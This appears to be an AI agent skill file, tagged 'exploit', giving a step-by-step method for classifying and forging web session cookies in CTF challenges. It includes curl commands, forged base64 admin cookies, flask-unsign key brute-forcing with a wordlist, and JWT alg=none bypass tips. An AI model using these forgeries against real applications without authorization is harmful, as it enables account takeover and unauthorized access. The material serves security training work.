---
name: cookie-analysis
description: "Session cookie 分析与伪造方法论。当发现 Web 应用使用 cookie 进行认证、需要判断 cookie 类型并选择伪造方法时使用。覆盖 unsigned base64 cookie 直接伪造、Flask 签名 cookie（flask-unsign 爆破密钥）、加密/二进制 cookie 的识别。本技能负责 cookie 类型判断和分流：如果判断为 JWT（三段式 eyJ 开头），应转至 jwt-attack-methodology；如果判断为加密 cookie 需要 Padding Oracle，应转至 crypto-web-attack"
metadata:
  tags: "cookie,session,flask,base64,forgery,authentication,bypass,cookie-analysis,认证绕过,flask-unsign,session cookie,itsdangerous,cookie伪造,unsigned cookie"
  category: "exploit"
---

# Cookie Analysis & Forgery Methodology

## When to Use
- You found a session cookie and want to forge it
- BEFORE running flask-unsign or any brute-force tool
- When you need to bypass authentication via cookie manipulation

## Step 1: Extract the cookie
```bash
curl -sI http://TARGET/ | grep -i set-cookie
```

## Step 2: Identify cookie type

### Test A: Base64 decode
```bash
echo '<cookie_value>' | base64 -d 2>/dev/null
# Also try URL-decoded version:
python3 -c "import base64,urllib.parse; print(base64.b64decode(urllib.parse.unquote('<cookie>')))"
```

**If it decodes to valid JSON** → **UNSIGNED BASE64** (most common in CTF!)
- Attack: forge directly — takes 5 seconds
```bash
# Forge admin session
echo -n '{"user_id":1}' | base64
# Use as cookie:
curl -b 'session=eyJ1c2VyX2lkIjoxfQ==' http://TARGET/admin/flag
```

- Try variations:
```bash
echo -n '{"user_id":1}' | base64
echo -n '{"role":"admin"}' | base64
echo -n '{"is_admin":true}' | base64
echo -n '{"user_id":1,"role":"admin"}' | base64
echo -n '{"username":"admin"}' | base64
```

### Test B: Flask itsdangerous signature
If the cookie has a `.` followed by a signature portion:
```bash
# Cookie looks like: eyJ...IjoxfQ.Xk2Ypg.dBV2_DkvOBP3...
flask-unsign --decode --cookie '<cookie>'
# If decode works → Flask signed cookie
flask-unsign --unsign --cookie '<cookie>' --wordlist $ABOUTSECURITY_ROOT/Dic/passwords.txt
```

### Test C: JWT
If the cookie has three base64 parts separated by `.`:
```bash
# Header.Payload.Signature
echo '<first_part>' | base64 -d  # Should show {"alg":"...","typ":"JWT"}
# → Use Skill(skill="jwt-attack-methodology")
```

### Test D: Encrypted/Binary
If base64 decode produces garbage → encrypted cookie
- Need key or padding oracle attack
- Check source code for encryption key

## Step 3: Common bypass patterns
- If unsigned: forge with user_id=1, role=admin, is_admin=true
- If Flask-signed: try common keys ('secret', app name, etc.)
- If JWT with alg=none: remove signature, set alg to "none"
- If JWT with HS256: try common secrets, check for JWKS endpoint

## Critical Reminders
- NEVER run flask-unsign on unsigned cookies — wastes 25+ minutes and ALWAYS fails
- Always decode the cookie FIRST to determine its type
- Base64 JSON cookies are the most common type in CTF challenges
- Direct forgery takes 5 seconds vs brute-forcing takes 25+ minutes
